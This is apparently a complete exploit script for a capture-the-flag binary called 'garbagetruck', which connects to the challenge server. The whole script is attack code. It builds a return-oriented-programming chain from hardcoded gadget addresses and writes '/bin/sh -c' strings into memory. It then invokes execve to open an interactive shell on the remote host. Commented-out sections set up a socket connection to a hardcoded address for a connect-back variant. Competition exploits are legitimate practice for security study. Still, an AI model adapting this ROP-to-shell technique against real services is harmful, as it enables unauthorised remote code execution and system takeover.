#!/usr/bin/env python
# coding:utf-8
# Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR

from ctf import *

binary = './garbagetruck_04bfbdf89b37bf5ac5913a3426994185b4002d65'
context.terminal = ['tmux', 'splitw', '-h']
mode = args['MODE'].lower()

code = context.binary = ELF(binary)
if args['LIBDEBUG']:
    os.environ['LD_LIBRARY_PATH'] = '/dbg{}/lib'.format(code.bits)
if args['LIBC']:
    os.environ['LD_PRELOAD'] = os.path.abspath(args['LIBC'])
libc = code.libc


def exploit():
    if mode == 'remote':
        io = remote('garbagetruck.chal.pwning.xxx', 6349)
        context.noptrace = True
    elif mode == 'debug':
        io = gdb.debug(binary, gdbscript='''
            c
        ''')
    else:
        io = process(binary)

    garbage_io = process(binary)

    def is_garbage(x):
        if x == 0:
            return False
        garbage_io.clean()
        garbage_io.sendline(x)
        output = garbage_io.recvline_contains('garbage')
        return 'Throwing' in output

    def set_rax(value):
        info('set rax = %#x', value)
        payload = []
        while not is_garbage(value):
            payload += [
                0x000000000049bdbd, # add rsp, 8 ; sub eax, 1 ; ret
                GARBAGE,
            ]
            value += 1
        payload = [
            0x0000000000402659, # pop rbx ; ret
            value,
            0x000000000040540d, # mov rax, rbx ; pop rbx ; ret
            GARBAGE,
        ] + payload
        return payload

    def set_rcx(value):
        info('set rcx = %#x', value)
        payload = []
        while not is_garbage(value):
            payload += [
                0x00000000004b9341, # inc ecx ; ret
            ]
            value -= 1
        payload = set_rax(RDI) + [
            0x00000000004892bf, # add byte ptr [rax], al ; add al, ch ; pop rcx ; ret
            value,
        ] + payload
        return payload

    def write_mem(addr, value):
        payload = []
        payload += set_rcx(addr)
        payload += set_rax(value)
        payload += [
            0x00000000004713e5, # mov qword ptr [rsi], rax ; ret
            0x0000000000486dcd, # mov rax, qword ptr [rdi + 0x20] ; mov qword ptr [rcx], rax ; ret
        ]
        return payload

    def write_mem_inner(value):
        if value == 0:
            return []
        payload = []
        payload += set_rax(value)
        payload += [
            0x00000000004713e5, # mov qword ptr [rsi], rax ; ret
            0x0000000000486dcd, # mov rax, qword ptr [rdi + 0x20] ; mov qword ptr [rcx], rax ; ret
        ]
        return payload

    RDI = 0x757f19
    RSI = RDI + 0x20
    SOCKET_BUF = 0x758009
    STACK_BUF = 0x75b005
    GARBAGE = 3

    FINAL_BUF = 0x759000

    rop = flat([
        # 0x00000000004980e9, # pop rdi ; ret
        # 2,
        # 0x0000000000406afb, # pop rsi ; ret
        # 1,
        # 0x00000000004f67f5, # pop rdx ; ret
        # 0,
        # code.plt['socket'],

        # 0x00000000004980e9, # pop rdi ; ret
        # 0,
        # 0x0000000000406afb, # pop rsi ; ret
        # SOCKET_BUF,
        # 0x00000000004f67f5, # pop rdx ; ret
        # 0x10,
        # code.plt['connect'],

        0x0000000000402115,
        0x00000000004980e9, # pop rdi ; ret
        FINAL_BUF,
        0x0000000000406afb, # pop rsi ; ret
        FINAL_BUF + 0x20,
        0x00000000004f67f5, # pop rdx ; ret
        0,
        0x000000000041a318, # pop rax ; ret
        59,
        0x4f8e2b, # syscall

        # 0x00000000004980e9, # pop rdi ; ret
        # SOCKET_BUF - 8,
        # 0x0000000000406afb, # pop rsi ; ret
        # 0,
        # 0x00000000004f67f5, # pop rdx ; ret
        # 7,
        # code.plt['open'],
        # 0x0000000000402115,

        # 0x00000000004980e9, # pop rdi ; ret
        # 1,
        # 0x0000000000406afb, # pop rsi ; ret
        # FINAL_BUF,
        # 0x00000000004f67f5, # pop rdx ; ret
        # 0x20,
        # code.plt['read'],
        # 0x0000000000402115,

        # 0x00000000004980e9, # pop rdi ; ret
        # 1,
        # 0x0000000000406afb, # pop rsi ; ret
        # FINAL_BUF,
        # 0x00000000004f67f5, # pop rdx ; ret
        # 0x20,
        # code.plt['write'],
        # 0x0000000000402115,

        # 0x00000000004061dd, # pop rsp ; ret
        # FINAL_BUF,

        # 0,
        0x401DE9,
    ])

    payload = [GARBAGE] * 27
    payload += [
        0x0000000000406afb, # pop rsi ; ret
        RSI,
        0x00000000004980e9, # pop rdi ; ret
        RDI,
    ]

    # payload += write_mem(SOCKET_BUF, 0xd2040002)
    # payload += write_mem(SOCKET_BUF + 4, 0xa9654f2d)
    # for i, value in enumerate(group(4, rop)):
    #     payload += write_mem(STACK_BUF - 3 + i * 4, u32(value))
    #     payload.append(0x0000000000402115) # ret (for debug)

    payload += set_rcx(FINAL_BUF)
    xxx = '/bin/sh\0'
    xxx += '/bin/sh\0'
    xxx += '-c\0'
    xxx += 'sh <&1 >&1\0'
    xxx = ljust(xxx, 0x20)
    xxx += p64(FINAL_BUF + 8)
    xxx += p64(FINAL_BUF + 0x10)
    xxx += p64(FINAL_BUF + 0x13)
    xxx += p64(0)
    for i, value in enumerate(group(4, xxx)):
        payload += write_mem_inner(u32(value))
        payload += [
            0x00000000004b9341, # inc ecx ; ret
        ] * 4

    payload += set_rcx(SOCKET_BUF)
    payload += write_mem_inner(0xd2040002)
    payload += [
        0x00000000004b9341, # inc ecx ; ret
    ] * 4
    payload += write_mem_inner(0xa9654f2d)
    payload += set_rcx(STACK_BUF)
    for i, value in enumerate(group(4, rop)):
        payload += write_mem_inner(u32(value))
        payload += [
            0x00000000004b9341, # inc ecx ; ret
        ] * 4

    payload.append(0x0000000000402115) # ret (for debug)
    payload += [
        0x00000000004061dd, # pop rsp ; ret
        STACK_BUF,
    ]
    # payload.append(0x401DE9) # output

    info('payload: %s', payload)
    info('payload length: %s', len(payload))
    io.sendlines(payload)
    io.clean()

    io.gdb.attach()
    io.gdb.b(0x000000000043b811)
    io.gdb.b(0x0000000000402115)
    io.sendline(0)

    io.interactive()


if __name__ == '__main__':
    exploit()
